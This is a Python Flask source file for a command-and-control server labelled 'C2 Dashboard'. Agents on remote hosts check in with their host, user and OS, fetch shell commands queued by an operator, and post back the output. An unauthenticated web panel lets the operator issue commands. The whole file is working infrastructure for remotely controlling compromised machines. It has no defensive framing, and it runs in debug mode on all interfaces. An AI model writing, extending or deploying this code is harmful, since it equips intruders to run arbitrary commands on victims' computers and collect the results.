from flask import Flask, request, jsonify, render_template, redirect, url_for
from datetime import datetime, timezone
import collections
import html

app = Flask(__name__)

# In-memory data stores. A database would be better for a real application.
clients = {}  # { 'client_id': {'last_seen': '...', 'info': {...}} }
command_queues = collections.defaultdict(list) # { 'client_id': ['cmd1', 'cmd2'] }
results = collections.defaultdict(list) # { 'client_id': [{'cmd': '...', 'output': '...'}] }

# --- Agent-facing API (Modified for Rust Agent) ---

@app.route("/telemetry", methods=["POST"])
def agent_telemetry():
    """
    Agent check-in endpoint (telemetry).
    The agent sends its info.
    """
    data = request.get_json()
    client_id = data.get("host")
    if not client_id:
        return jsonify({"error": "Host identifier is required"}), 400

    # Update client info and last seen time
    clients[client_id] = {
        "last_seen": datetime.now(timezone.utc).isoformat(),
        "info": data
    }
    print(f"[*] Telemetry received from {client_id}")
    return "", 204

@app.route("/get_command", methods=["POST"])
def agent_get_command():
    """
    Agent requests a command.
    """
    data = request.get_json()
    client_id = data.get("host")
    if not client_id:
         return jsonify({"error": "Host identifier is required"}), 400

    # Retrieve and clear the command queue for this client
    # The Rust agent fetches one command at a time.
    command_to_run = ""
    if client_id in command_queues and command_queues[client_id]:
        command_to_run = command_queues[client_id].pop(0)

    return jsonify({"command": command_to_run})

@app.route("/send_result", methods=["POST"])
def agent_results():
    """
    Agent posts command results here.
    """
    data = request.get_json()
    client_id = data.get("host")
    if not client_id:
        return jsonify({"error": "Host identifier is required"}), 400

    # Store result
    result_data = {
        "command": data.get("command"),
        "output": data.get("output"),
        "timestamp": datetime.now(timezone.utc).isoformat()
    }
    results[client_id].append(result_data)

    print(f"[+] Result from {client_id} for command '{data.get('command')}':\n{data.get('output')}\n{'-'*50}")

    return "", 204


# --- Admin Web UI (Unchanged) ---

@app.route("/")
def index():
    """
    Main dashboard, lists all connected clients.
    """
    return render_template('index.html', clients=clients)

@app.route("/client/<client_id>", methods=["GET", "POST"])
def client_view(client_id):
    """
    View a specific client, issue commands, and see results.
    """
    if client_id not in clients:
        return "Client not found", 404

    if request.method == "POST":
        command = request.form.get("command")
        if command:
            # The Rust agent expects a newline for shell execution
            command_queues[client_id].append(command)
        return redirect(url_for('client_view', client_id=client_id))

    client_info = clients.get(client_id, {})
    client_results = results.get(client_id, [])
    # Pass the html escape function to the template
    return render_template('client_view.html',
                           client_id=client_id,
                           info=client_info.get('info', {}),
                           results=reversed(client_results), # Show newest first
                           pending_commands=command_queues.get(client_id, []),
                           escape=html.escape)

if __name__ == "__main__":
    # Create the templates directory and the required HTML files
    import os
    if not os.path.exists('templates'):
        os.makedirs('templates')

    index_html = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>C2 Dashboard</title>
    <style>
        body { font-family: sans-serif; margin: 2em; background: #f4f4f9; color: #333; }
        table { width: 100%; border-collapse: collapse; }
        th, td { padding: 12px; border: 1px solid #ddd; text-align: left; }
        th { background-color: #4CAF50; color: white; }
        tr:nth-child(even) { background-color: #f2f2f2; }
        tr:hover { background-color: #ddd; }
        a { color: #4CAF50; text-decoration: none; }
        a:hover { text-decoration: underline; }
    </style>
</head>
<body>
    <h1>C2 Client Dashboard</h1>
    <table>
        <thead>
            <tr>
                <th>Client ID (Host)</th>
                <th>User</th>
                <th>Operating System</th>
                <th>Last Seen (UTC)</th>
                <th>Actions</th>
            </tr>
        </thead>
        <tbody>
            {% for id, client in clients.items() %}
            <tr>
                <td>{{ id }}</td>
                <td>{{ client.info.user }}</td>
                <td>{{ client.info.os }}</td>
                <td>{{ client.last_seen }}</td>
                <td><a href="{{ url_for('client_view', client_id=id) }}">Interact</a></td>
            </tr>
            {% else %}
            <tr>
                <td colspan="5">No clients have checked in yet.</td>
            </tr>
            {% endfor %}
        </tbody>
    </table>
</body>
</html>
    """
    with open('templates/index.html', 'w') as f:
        f.write(index_html)

    client_view_html = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Interact with {{ client_id }}</title>
    <style>
        body { font-family: sans-serif; margin: 2em; background: #f4f4f9; color: #333; }
        h1, h2 { color: #4CAF50; }
        a { color: #4CAF50; }
        .container { max-width: 900px; margin: auto; }
        .info-box, .command-box, .results-box { background: white; padding: 20px; margin-bottom: 20px; border-radius: 5px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
        pre { background: #eee; padding: 10px; border: 1px solid #ddd; white-space: pre-wrap; word-wrap: break-word; }
        input[type="text"] { width: 70%; padding: 10px; border: 1px solid #ccc; border-radius: 4px; }
        button { padding: 10px 20px; background: #4CAF50; color: white; border: none; border-radius: 4px; cursor: pointer; }
        button:hover { background: #45a049; }
        hr { border: 0; height: 1px; background: #ddd; }
    </style>
</head>
<body>
    <div class="container">
        <p><a href="{{ url_for('index') }}">&larr; Back to Dashboard</a></p>
        <h1>Client: {{ client_id }}</h1>

        <div class="info-box">
            <h2>Client Information</h2>
            <pre>{{ info }}</pre>
        </div>

        <div class="command-box">
            <h2>Issue Command</h2>
            <form method="post">
                <input type="text" name="command" placeholder="Enter shell command" autofocus required>
                <button type="submit">Send Command</button>
            </form>
            {% if pending_commands %}
                <h3>Pending Commands</h3>
                <ul>
                {% for cmd in pending_commands %}
                    <li><code>{{ escape(cmd) }}</code></li>
                {% endfor %}
                </ul>
            {% endif %}
        </div>

        <div class="results-box">
            <h2>Command History</h2>
            {% for r in results %}
                <p>
                    <b>Command:</b> <code>{{ escape(r.command) }}</code><br>
                    <b>Executed at (UTC):</b> {{ r.timestamp }}
                </p>
                <pre>{{ escape(r.output) }}</pre>
                <hr>
            {% else %}
                <p>No results from this client yet.</p>
            {% endfor %}
        </div>
    </div>
    <script>
        // Auto-refresh the page every 5 seconds to check for new results
        setInterval(function() {
            // Don't refresh if the user is currently typing a command
            if (!document.querySelector('input[name="command"]:focus')) {
                window.location.reload();
            }
        }, 5000);
    </script>
</body>
</html>
    """
    with open('templates/client_view.html', 'w') as f:
        f.write(client_view_html)

    print("Starting C2 server on http://0.0.0.0:8080")
    app.run(host="0.0.0.0", port=8080, debug=True)
